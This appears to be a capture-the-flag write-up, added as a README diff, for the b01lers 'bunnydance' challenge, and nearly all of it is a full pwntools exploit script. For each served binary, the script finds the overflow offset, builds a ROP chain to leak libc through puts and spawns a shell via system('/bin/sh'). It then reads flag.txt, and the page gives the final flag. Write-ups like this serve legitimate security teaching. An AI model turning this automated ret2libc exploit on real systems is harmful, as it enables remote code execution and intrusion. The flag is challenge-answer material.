@@ -1,0 +1,157 @@
+# bunnydance
+
+## Description
+
+Wait a minute isn't this just DARPA CGC LITE v3.0?
+
+Guys seriously maybe we should stop putting this challenge in every CTF...
+
+Difficulty: Medium
+
+chal.b01lers.com 4001
+
+by nsnc
+
+## Challenge
+
+Randomly selected binaries.
+
+## Solution
+
+pwntools go brrrr
+
+## Exploit
+
+```py
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host chal.b01lers.com --port 4001
+from pwn import *
+from IPython import embed
+
+import codecs
+
+# Set up pwntools for the correct architecture
+libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
+ld = ELF("./ld-2.31.so")
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'chal.b01lers.com'
+port = int(args.PORT or 4001)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    return io
+
+def start(argv=[], *a, **kw):
+    return remote(argv, *a, **kw)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+problem = 0
+io = start()
+io.recvline()
+io.recvline()
+io.recvline()
+io.recvline()
+
+while problem < 9:
+    io.recvuntil("b")
+    raw = io.recvuntil(": \n")
+    raw = raw[1:raw.rfind(b"'")]
+    b = codecs.escape_decode(raw)[0]
+    f = open('bin', 'wb')
+    f.write(b)
+    f.close()
+
+    exe = context.binary = ELF('bin')
+
+    p = process('./bin')
+
+    base = 0x400000
+
+    main = exe.symbols['main']
+    puts_plt = exe.plt['puts']
+    puts_got = exe.got['puts']
+    p.success("main address: {}".format(hex(main)))
+    p.success("puts_plt address: {}".format(hex(puts_plt)))
+    p.success("puts_got address: {}".format(hex(puts_got)))
+
+    p.recvuntil(": \n")
+    p.sendline(cyclic(0x80, n=8))
+    p.recvall()
+
+    core = p.corefile
+
+    fault = cyclic_find(core.fault_addr, n=8)
+
+    rop = ROP(exe)
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret = rop.find_gadget(['ret'])[0]
+
+    leak_payload = flat({
+        fault: [
+            pop_rdi,
+            puts_got,
+            puts_plt,
+            main,
+            ]
+        })
+
+    io.sendline(leak_payload)
+
+    io.recvuntil(('Got: \n', 'Hello, \n'))
+    io.recvline()
+    libc_leak = io.recvline()[:-1]
+
+    libc.address = u64(libc_leak.ljust(8, b'\x00')) - (libc.symbols['puts'] - libc.address)
+    bin_sh = next(libc.search(b'/bin/sh'))
+    system = libc.symbols['system']
+    io.success("libc address: {}".format(hex(libc.address)))
+    io.success("/bin/sh address: {}".format(hex(bin_sh)))
+    io.success("system address: {}".format(hex(system)))
+
+    shell_payload = flat({
+        fault: [
+            ret,
+            pop_rdi,
+            bin_sh,
+            system,
+            ]
+        })
+
+    io.sendline(shell_payload)
+    io.recvuntil(('Got: \n', 'Hello, \n'))
+    io.recvline()
+
+    io.sendline('cat flag.txt')
+    flag = io.recvuntil('}')
+    io.success("Flag: {}".format(flag))
+    io.sendline('exit')
+    io.recvuntil('flag>')
+    io.sendline(flag)
+
+    problem += 1
+
+io.interactive()
+```
+
+## Flag
+
+`flag{n0w_d0_th3_bunnyd4nc3}`
+
